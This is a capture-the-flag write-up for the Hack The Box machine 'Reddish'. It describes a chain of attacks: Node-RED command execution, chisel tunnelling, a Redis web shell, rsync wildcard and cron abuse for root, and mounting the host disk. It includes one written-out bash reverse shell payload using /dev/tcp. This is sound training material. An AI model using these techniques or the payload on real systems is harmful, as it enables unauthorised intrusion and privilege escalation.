# Reddish

*Converted from: Reddish.pdf*

---

# Reddish
## **22 [nd] January 2019 / Document No D19.100.04**

**Prepared By: egre55**

**Machine Author: yuntao**

**Difficulty: Insane**

**Classification: Official**


Page 1 / 18


## **SYNOPSIS**

Reddish is a very challenging but rewarding machine, which teaches concepts and techniques

applicable to many situations.


This writeup serves as a written compliment to IppSec’s Reddish video, which is a masterclass in

tunneling, and directly references it. IppSec’s videos are packed full of learning and are highly

recommended!


## **Skills Required**


  - Basic knowledge of Web application

enumeration techniques

  - Basic knowledge of networking

  - Basic / intermediate knowledge of

Linux


## **Skills Learned**


  - Gaining situational awareness

  - Tunneling

  - Exploitation of default Redis

configurations

  - Leveraging Cron jobs for lateral

movement and privilege escalation

  - Rsync wildcard abuse


Page 2 / 18


## **Enumeration** **Nmap**





Nmap reveals that only TCP port 1880 is open, which has been identified as Node.js Express

Framework.


Page 3 / 18


## **Web Application Enumeration**

Visual inspection of the web page reveals that the GET request failed, but a favicon is visible,

which could help to identify the application. The image is downloaded.


After navigating to the web page on port 1880 again, Burp Suite is used to change the request

type to POST. The path to the Node-RED Editor is returned as JSON data.


Page 4 / 18


## **Exploitation** **Foothold via Node-RED RCE**

Node-RED is a programming tool that allows nodes representing devices, APIs and services to be

linked together. It also contains an "exec" node, allowing for OS command execution. The "tcp"

input node is dragged to the canvas and configured to connect to the attacking host.


This is connected to an "exec" node, which is itself connected to a "tcp" output node. The output

node is configured to "Reply to TCP". The three lines connecting the "exec" and "tcp" output node

represent the three streams stdin, stdout and stderr.


After clicking "Deploy", a shell is received, and a listener is stood up to catch an upgraded shell.





Page 5 / 18


## **Post Exploitation** **Situational Awareness**

The /.dockerenv file reveals that the foothold is situated within a Docker container.


`netstat` is not available, but `ss -twurp` confirms that there are no other services listening

locally.


The container is connected to 172.18.0.0 and 172.19.0.0 networks.


These networks are enumerated, and additional hosts 172.19.0.2 and 172.19.0.3 are discovered.





Page 6 / 18


**Note** : Docker randomizes the assignment of the .2, .3 and .4 IP addresses to the **nodered**, **www**

and **redis** containers on each boot, requiring us to determine the assignment each time.


OpenSSL is available and can be used to scan commonly used ports on the identified hosts.





This reveals that port 80 on 172.19.0.3 is accessible.



Page 7 / 18


## **Enumeration** Creation of Tunnel

In order to examine this further, "chisel" (created by Jaime Pillora / @jpillora) is used to set up a

tunnel and make this port accessible remotely.


[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)


chisel is installed, a nc listener is stood up to transfer it, and the server is started.





chisel is downloaded to 172.19.0.4, the client is started and the tunnel is created.





Page 8 / 18


## Inspection of Web Page

After navigating to the web page, the source code is inspected, which reveals several functions.


Page 9 / 18


i



The developer has made the web folder accessible to a database container (presumed to be

172.19.0.2).

## Identification of Redis Instance


A full port scan of 172.19.0.2 is undertaken, which reveals that port 6379 is open.


i



i



i



This port is commonly associated with "Redis", an open-source in-memory project that provides

database, caching a message broker services. The developer of Redis (@antirez), reveals how it

is possible to exploit "unprotected by default" Redis instances, and what steps can be taken to

secure Redis if required.


[https://packetstormsecurity.com/fles/134200/Redis-Remote-Command-Execution.htmli](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html)


Page 10 / 18


## **Lateral Movement to 172.19.0.3** Write Web Shell

Another tunnel in created on 172.19.0.4, in order to make Redis accessible remotely.





In the Reddish video, IppSec uses the following commands to write a webshell to the webroot.





The webshell is successfully tested with the command `id`, which returns the expected output.


The browser proxy is set to point to Burp, "localhost" is removed from the "No Proxy for" section,

and the request is captured.


## Upgrade Web Shell to Reverse Shell

Another tunnel is created in preparation for the reverse shell, and a nc listener is stood up on port

8005.





The request type is changed to POST, and a request with the reverse shell payload below is sent.

```
cmd=bash+-c+"bash+-i+>%26+/dev/tcp/172.19.0.4/9002+0>%261"

```

A reverse shell from 172.19.0.3 running as www-data is received.


Page 12 / 18


## Identification of "backup" Cron Job

Another tunnel is created in order to facilitate the transfer of LinEnum.sh (created by rebootuser /

@in-security), before using nc to copy the script.


[https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)





Inspection of LinEnum output reveals a Cron job called "backup" within /etc/cron.d


The job executes /backup/backup.sh as root. Examination of this shell script reveals local *.rdb

files are transferred to the host "backup" from a folder owned by www-data, before restoring the

local contents of /var/www/html from a previous backup to this host. Of note, rsync is used to

transfer the files, and the cron rsync command makes use of wildcards. If rsync processes a file

which includes the "-e" parameter, command execution can be achieved.


[https://gtfobins.github.io/gtfobins/rsync/](https://gtfobins.github.io/gtfobins/rsync/)


Page 13 / 18


## Exploitation of Cron Job

The file "reddish.rdb" is created locally with the contents below.





This is base64 transferred to 172.19.0.3.





The file "-e sh reddish.rdb" is created in the www-data owned subdirectory.





The root owned setuid binary "/var/tmp/privesc" is created and is is possible to execute

commands as root. It can now be confirmed that the host "backup" has IP Address 172.20.0.2.


user.txt can now be gained.


Page 14 / 18


## Exploitation of rsync Arbitrary File Write

rsync has been configured such that a password is not required. This allows for any file to be

read or written, as root on 172.20.0.2.





In order to receive a reverse shell from 172.20.0.2, chisel is transferred to 172.19.0.3.









The commands below are then executed on 172.19.0.3, in order to add a reverse shell command

to the existing "clean" Cron job on 172.20.0.2.





Page 15 / 18


## **Lateral Movement to 172.20.0.2**

Shortly afterwards, a reverse shell is received as root on "backup".



Page 16 / 18


## Enumeration of Partitions

Enumeration of /dev reveals several unmounted partitions (sda1 - sda5). These partitions are

mounted and their contents inspected.





sda2 contains the host filesystem.


A new listener is stood up, and a reverse shell payload is added to a Cron job within

/sda2/etc/cron.d





Page 17 / 18


## **Lateral Movement to 10.10.10.94 (Reddish)**

The Cron job is run, a shell is received as root on 10.10.10.94 (Reddish), and root.txt can be

captured.


Page 18 / 18


